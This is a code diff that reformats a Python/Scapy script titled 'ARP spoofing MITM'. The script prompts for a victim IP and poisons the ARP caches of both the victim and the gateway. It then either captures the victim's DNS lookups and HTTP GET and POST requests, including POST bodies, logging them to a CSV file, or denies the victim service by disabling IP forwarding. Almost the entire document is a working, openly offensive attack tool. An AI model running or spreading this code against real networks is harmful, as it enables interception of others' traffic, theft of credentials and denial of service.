@@ -8,31 +8,57 @@ from datetime import datetime
 
 # gets mac address from ip
 def get_MACaddress(ip) :
-	pack = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip, hwdst="ff:ff:ff:ff:ff:ff")
-	resp = srp1(pack, verbose=0, timeout=2)
-	if resp : return resp.hwsrc
-	else : return None
+	pack = Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = ip, hwdst = "ff:ff:ff:ff:ff:ff")
+	resp = srp1(pack, verbose = 0, timeout = 2)
+	if resp : 
+		return resp.hwsrc
+	else : 
+		return None
 
 # victim poisoning, sends ARP packets to victim by faking gateway
 def v_poison() :
-	p = Ether(dst=V_MAC)/ARP(psrc=GW_IP, pdst=V_IP, hwdst=V_MAC)
+	p = Ether(dst = V_MAC)/ARP(psrc = GW_IP, pdst = V_IP, hwdst = V_MAC)
 	while True :
-		try : srp1(p, verbose=0, timeout=1)
-		except KeyboardInterrupt : sys.exit(1)
+		try : 
+			srp1(p, verbose = 0, timeout = 1)
+		except KeyboardInterrupt : 
+			sys.exit(1)
 
 # gateway poisoning, sends ARP packets to the gateway by faking victim
 def gw_poison() :
-	p = Ether(dst=GW_MAC)/ARP(psrc=V_IP, pdst=GW_IP, hwdst=GW_MAC)
+	p = Ether(dst = GW_MAC)/ARP(psrc = V_IP, pdst = GW_IP, hwdst = GW_MAC)
 	while True :
-		try : srp1(p, verbose=0, timeout=1)
-		except KeyboardInterrupt : sys.exit(1)
+		try : 
+			srp1(p, verbose = 0, timeout = 1)
+		except KeyboardInterrupt : 
+			sys.exit(1)
 
 # captures, displays and exentually saves the required traffic of a packet
 def sniff_request() :
-	if SNIFF_SERVICES[SNIFF_SERVICE] == "DNS" : sniff(iface=INTERFACE, filter='udp port 53', prn=dns_sniff_request)
-	elif SNIFF_SERVICES[SNIFF_SERVICE] == "HTTP GET" : sniff(iface=INTERFACE, filter='tcp port 80', prn=http_sniff_get_request)
-	elif SNIFF_SERVICES[SNIFF_SERVICE] == "HTTP POST" : sniff(iface=INTERFACE, filter='tcp port 80', prn=http_sniff_post_request)
-	elif SNIFF_SERVICES[SNIFF_SERVICE] == "ALL AVAILABLE" : sniff(iface=INTERFACE, filter='tcp port 80 or udp port 53', prn=sniff_all)
+	if SNIFF_SERVICES[SNIFF_SERVICE] == "DNS" :
+		sniff(
+			iface = INTERFACE,
+			filter = 'udp port 53',
+			prn = dns_sniff_request
+			)
+	elif SNIFF_SERVICES[SNIFF_SERVICE] == "HTTP GET" :
+		sniff(
+			iface = INTERFACE,
+			filter = 'tcp port 80',
+			prn = http_sniff_get_request
+			)
+	elif SNIFF_SERVICES[SNIFF_SERVICE] == "HTTP POST" :
+		sniff(
+			iface = INTERFACE,
+			filter = 'tcp port 80',
+			prn = http_sniff_post_request
+			)
+	elif SNIFF_SERVICES[SNIFF_SERVICE] == "ALL AVAILABLE" :
+		sniff(
+			iface = INTERFACE,
+			filter = 'tcp port 80 or udp port 53',
+			prn = sniff_all
+			)
 	else :
 		print("Fatal Error: Missing action!\nAborting...")
 		sys.exit(1)
@@ -48,20 +74,39 @@ def sniff_all(pkt) :
 def dns_sniff_request(pkt) :
 	# adding sourcecondition
 	try : 
-		pkt.getlayer(IP).src 
-		pkt.getlayer(Ether).src 
+		pkt.getlayer(IP).src
+		pkt.getlayer(Ether).src
 	except AttributeError :
 		return
-	if  pkt.getlayer(IP).src==V_IP and pkt.getlayer(Ether).src==V_MAC and pkt.haslayer(DNS) and pkt.getlayer(DNS).qr==0 :
+	if (
+		pkt.getlayer(IP).src == V_IP and
+		pkt.getlayer(Ether).src == V_MAC and
+		pkt.haslayer(DNS) and
+		pkt.getlayer(DNS).qr == 0
+		) :
 		date = datetime.now().strftime('[%Y-%m-%d %H:%M:%S]')
-		print(date+" Service: DNS"+" Victim: "+pkt.getlayer(IP).src+" ("+pkt.getlayer(Ether).src+") is resolving "+pkt.getlayer(DNS).qd.qname)
+		print(
+			date +
+			" Service: DNS" +
+			" Victim: " +
+			pkt.getlayer(IP).src +
+			" (" +
+			pkt.getlayer(Ether).src +
+			") is resolving " +
+			pkt.getlayer(DNS).qd.qname)
 		if not SAVE_FILE_PATH == "" :
-			save_to_csv_file([date,pkt.getlayer(IP).src,pkt.getlayer(Ether).src,"DNS request",pkt.getlayer(DNS).qd.qname])
+			save_to_csv_file(
+				[
+					date,pkt.getlayer(IP).src,pkt.getlayer(Ether).src,
+					"DNS request",
+					pkt.getlayer(DNS).qd.qname
+				]
+				)
 
 
 # captures, displays and eventually saves http GET requests
 def http_sniff_get_request(pkt) :
-	if pkt.haslayer(TCP) and pkt.getlayer(TCP).dport==80 :
+	if pkt.haslayer(TCP) and pkt.getlayer(TCP).dport == 80 :
 		try :
 			# getting GET request and Host header
 			raw_content = str(pkt.getlayer(TCP))
@@ -72,8 +117,10 @@ def http_sniff_get_request(pkt) :
 				if "GET" in line :
 					get_line = line.split(" ")
 					for index, l in enumerate(get_line) :
-						if "GET" in l : get_request = get_line[index+1]
-				if "Host:" in line : host_request = line.split(" ")[1]
+						if "GET" in l :
+							get_request = get_line[index + 1]
+				if "Host:" in line :
+					host_request = line.split(" ")[1]
 			# checking if packet has source fields
 			try : 
 				pkt.getlayer(IP).src 
@@ -81,12 +128,33 @@ def http_sniff_get_request(pkt) :
 			except AttributeError :
 				return
 			# displaying content if GET request is found and if it is from Victim
-			if  pkt.getlayer(IP).src==V_IP and pkt.getlayer(Ether).src==V_MAC and not get_request == "" : 
+			if (
+				pkt.getlayer(IP).src == V_IP and
+				pkt.getlayer(Ether).src == V_MAC and
+				not get_request == ""
+				) : 
 				date = datetime.now().strftime('[%Y-%m-%d %H:%M:%S]')
-				print(date+" Service: HTTP_GET"+" Victim: "+pkt.getlayer(IP).src+" ("+pkt.getlayer(Ether).src+") is requiring document: "+host_request+get_request)
+				print(
+					date +
+					" Service: HTTP_GET" +
+					" Victim: " +
+					pkt.getlayer(IP).src +
+					" (" +
+					pkt.getlayer(Ether).src +
+					") is requiring document: " +
+					host_request +
+					get_request)
 				if not SAVE_FILE_PATH == "" :
-					save_to_csv_file([date,pkt.getlayer(IP).src,pkt.getlayer(Ether).src,"HTTP_GET request",host_request+get_request])
-		except IndexError : return
+					save_to_csv_file(
+						[
+							date,pkt.getlayer(IP).src,
+							pkt.getlayer(Ether).src,
+							"HTTP_GET request",
+							host_request + get_request
+						]
+						)
+		except IndexError : 
+			return
 
 # captures, displays and eventually saves http POST requests
 def http_sniff_post_request(pkt) :
@@ -103,12 +171,13 @@ def http_sniff_post_request(pkt) :
 				if "POST" in line :
 					post_line = line.split(" ")
 					for index1, l in enumerate(post_line) :
-						if "POST" in l : post_request = post_line[index1+1]
+						if "POST" in l :
+							post_request = post_line[index1 + 1]
 				if "Host:" in line :
 					host_request = line.split(" ")[1]
 				if line == "" and found_first_empty_line == False :
 					found_first_empty_line = True
-					post_content = lines[index+1]
+					post_content = lines[index + 1]
 			# checking if packet has source fields
 			try : 
 				pkt.getlayer(IP).src 
@@ -116,22 +185,55 @@ def http_sniff_post_request(pkt) :
 			except AttributeError :
 				return
 			# displaying content if GET request is found and if it is from Victim
-			if  pkt.getlayer(IP).src==V_IP and pkt.getlayer(Ether).src==V_MAC and not post_request == "" : 
+			if (
+				pkt.getlayer(IP).src == V_IP and
+				pkt.getlayer(Ether).src == V_MAC and
+				not post_request == ""
+				) : 
 				date = datetime.now().strftime('[%Y-%m-%d %H:%M:%S]')
-				print(date+" Service: HTTP_POST"+" Victim: "+pkt.getlayer(IP).src+" ("+pkt.getlayer(Ether).src+")"+" is sending document: "+host_request+post_request+" Content:"+post_content)
+				print(
+					date +
+					" Service: HTTP_POST" +
+					" Victim: " +
+					pkt.getlayer(IP).src +
+					" (" +
+					pkt.getlayer(Ether).src +
+					")" +
+					" is sending document: " +
+					host_request +
+					post_request +
+					" Content:" +
+					post_content
+					)
 				if not SAVE_FILE_PATH == "" :
-					save_to_csv_file([date,pkt.getlayer(IP).src,pkt.getlayer(Ether).src,"HTTP_POST request","POST location:"+host_request+post_request+" Content:"+post_content])
-		except IndexError : return
+					save_to_csv_file(
+						[
+							date,pkt.getlayer(IP).src,
+							pkt.getlayer(Ether).src,
+							"HTTP_POST request",
+							(
+								"POST location:" +
+								host_request +
+								post_request +
+								" Content:" +
+								post_content
+							)
+						]
+						)
+		except IndexError :
+			return
 
 # saves an array of strings to the file in SAVE_FILE_PATH by appending a the array as a comma separated values line
 def save_to_csv_file(elements) :
 	CSV_SEPARATOR = ';'
-	out_file = open(SAVE_FILE_PATH,"a")
+	out_file = open(SAVE_FILE_PATH, "a")
 	cs = ""
 	for index, el in enumerate(elements) :
-		if index == len(elements) - 1 : cs += el
-		else : cs += el + CSV_SEPARATOR
-	out_file.write(cs+"\n")
+		if index == len(elements) - 1 :
+			cs += el
+		else :
+			cs += el + CSV_SEPARATOR
+	out_file.write(cs + "\n")
 
 # prints to screen an array of strings by surrounding them in a frame
 def program_header(elements) :
@@ -140,17 +242,20 @@ def program_header(elements) :
 	longest = 0
 	sep = '#'
 	for elm in elements : 
-		if len(elm) > longest : longest = len(elm)
-	print(sep*(longest+4))
-	for elm in elements : print(sep+" "+elm+" "*(longest-len(elm))+" "+sep)
-	print(sep*(longest+4))
+		if len(elm) > longest :
+			longest = len(elm)
+	print(sep * (longest + 4))
+	for elm in elements :
+		print(sep + " " + elm + " " * (longest - len(elm)) + " " + sep)
+	print(sep * (longest + 4))
 
 
 # presentation
 program_header([
 	"ARP spoofing MITM",
 	"Version: 0.3",
-	"Author: Carlo Cervellin"])
+	"Author: Carlo Cervellin"
+	])
 
 # constants
 ATTACK_TYPE_SNIFF = 0
@@ -167,46 +272,81 @@ DEFAULT_GATEWAY_IP = "192.168.0.1"
 DEFAULT_INTERFACE = "wlan0"
 
 # receiving user input
-print("\n"+"="*20+" TARGETS DEFINITION "+"="*20)
+print("\n" + "=" * 20 + " TARGETS DEFINITION " + "=" * 20)
 V_IP = raw_input("Insert the IP address to attack: ")
-GW_IP = raw_input("Insert the gateway IP address [default \""+DEFAULT_GATEWAY_IP+"\"]: ")
-INTERFACE = raw_input("Insert the network interface name [default \""+DEFAULT_INTERFACE+"\"]: ")
-print("="*20+" ATTACK TYPE DEFINITION "+"="*20)
+GW_IP = raw_input(
+	"Insert the gateway IP address [default \"" +
+	DEFAULT_GATEWAY_IP +
+	"\"]: "
+	)
+INTERFACE = raw_input(
+	"Insert the network interface name [default \"" +
+	DEFAULT_INTERFACE +
+	"\"]: "
+	)
+print("=" * 20 + " ATTACK TYPE DEFINITION " + "=" * 20)
 ATTACK_TYPE = 0
 ATTACK_TYPE_INPUT = raw_input(
 	"Choose tattack type:\n"+
 	"\t[0, empty, invalid] SNIFF\n"+
 	"\t[1] DOS\n")
-try : ATTACK_TYPE = int(ATTACK_TYPE_INPUT)
-except ValueError : pass
+try :
+	ATTACK_TYPE = int(ATTACK_TYPE_INPUT)
+except ValueError :
+	pass
 
 SNIFF_SERVICE = 0
 SAVE_FILE_PATH = ""
 if ATTACK_TYPE == ATTACK_TYPE_SNIFF :
 	SNIFF_SERVICE_INPUT = raw_input(
-	"Choose tattack type:\n"+
-	"\t[0, empty, invalid] ALL AVAILABLE\n"+
-	"\t[1] HTTP GET\n"+
-	"\t[2] HTTP POST\n"+
-	"\t[3] DNS\n")
-	try : SNIFF_SERVICE = int(SNIFF_SERVICE_INPUT)
-	except ValueError : pass
-	SAVE_FILE_PATH = raw_input("Save output file name or path (output file is a csv file) [empty means no saving file]: ")
+	"Choose tattack type:\n" +
+	"\t[0, empty, invalid] ALL AVAILABLE\n" +
+	"\t[1] HTTP GET\n" +
+	"\t[2] HTTP POST\n" +
+	"\t[3] DNS\n"
+	)
+	try :
+		SNIFF_SERVICE = int(SNIFF_SERVICE_INPUT)
+	except ValueError :
+		pass
+	SAVE_FILE_PATH = raw_input(
+		"Save output file name or path (output file is a csv file) [empty means no saving file]: "
+		)
 
 # checking user ip target and network interface and setting default in case missing
-if GW_IP is None or GW_IP == "" : GW_IP = DEFAULT_GATEWAY_IP
-if INTERFACE is None or INTERFACE == "" : INTERFACE = DEFAULT_INTERFACE
+if GW_IP is None or GW_IP == "" :
+	GW_IP = DEFAULT_GATEWAY_IP
+if INTERFACE is None or INTERFACE == "" :
+	INTERFACE = DEFAULT_INTERFACE
 
 # print a final resume of user input variables
 if ATTACK_TYPE == ATTACK_TYPE_SNIFF :
 	SERVICE_STRING = SNIFF_SERVICES[0]
 	try : SERVICE_STRING = SNIFF_SERVICES[SNIFF_SERVICE]
 	except IndexError : pass
-	print("ATTACK RESUME: sniffing "+V_IP+" "+SERVICE_STRING+" traffic with gateway "+GW_IP+" from network interface "+INTERFACE+"")
+	print(
+		"ATTACK RESUME: sniffing " +
+		V_IP +
+		" " +
+		SERVICE_STRING +
+		" traffic with gateway " +
+		GW_IP +
+		" from network interface " +
+		INTERFACE +
+		""
+		)
 	_SAVE_FILE_ABSOLUTE_PATH = os.path.abspath(SAVE_FILE_PATH)
-	if not SAVE_FILE_PATH == "" : print("Saving output to file: "+_SAVE_FILE_ABSOLUTE_PATH)
+	if not SAVE_FILE_PATH == "" :
+		print("Saving output to file: " + _SAVE_FILE_ABSOLUTE_PATH)
 elif ATTACK_TYPE == ATTACK_TYPE_DOS :
-	print("ATTACK RESUME: denying services for "+V_IP+" with gateway "+GW_IP+" from network interface "+INTERFACE)
+	print(
+		"ATTACK RESUME: denying services for " +
+		V_IP +
+		" with gateway " +
+		GW_IP +
+		" from network interface " +
+		INTERFACE
+		)
 else : 
 	print("Fatal Error, ATTACK_TYPE not defined\nAborting...")
 	sys.exit(1)
@@ -218,25 +358,32 @@ print("Obtaining MAC addresses (may take a few attempts)...")
 while True :
 	V_MAC = get_MACaddress(V_IP)
 	GW_MAC = get_MACaddress(GW_IP)
-	if V_MAC is None : print("Cannot find victim MAC address ("+V_IP+"), retrying...")
-	elif GW_MAC is None : print("Cannot find victim MAC address ("+GW_IP+"), retrying...")
-	else : break
+	if V_MAC is None :
+		print("Cannot find victim MAC address (" + V_IP + "), retrying...")
+	elif GW_MAC is None :
+		print("Cannot find victim MAC address (" + GW_IP + "), retrying...")
+	else : 
+		break
 print("Attack targets have been found!")
 
 # showing ARP spoofing targets
-print("Victim: "+V_IP+" ("+V_MAC+")")
-print("Gateway: "+GW_IP+" ("+GW_MAC+")")
+print("Victim: " + V_IP + " (" + V_MAC + ")")
+print("Gateway: " + GW_IP + " (" + GW_MAC + ")")
 print("Poisoning victim and gateway...")
 
 # enable or disable IP forwarding
-if ATTACK_TYPE == ATTACK_TYPE_DOS : os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
-else : os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
+if ATTACK_TYPE == ATTACK_TYPE_DOS :
+	os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
+else :
+	os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
 
 vthread = []
 gwthread = []
 
-if ATTACK_TYPE == ATTACK_TYPE_SNIFF : print("Showing sniffed traffic...")
-elif ATTACK_TYPE == ATTACK_TYPE_DOS : print("DOS attack in action...")
+if ATTACK_TYPE == ATTACK_TYPE_SNIFF :
+	print("Showing sniffed traffic...")
+elif ATTACK_TYPE == ATTACK_TYPE_DOS :
+	print("DOS attack in action...")
 print("INFO: Stop script by pressing the interrupt key combination CTRL+C")
 
 # main program loop
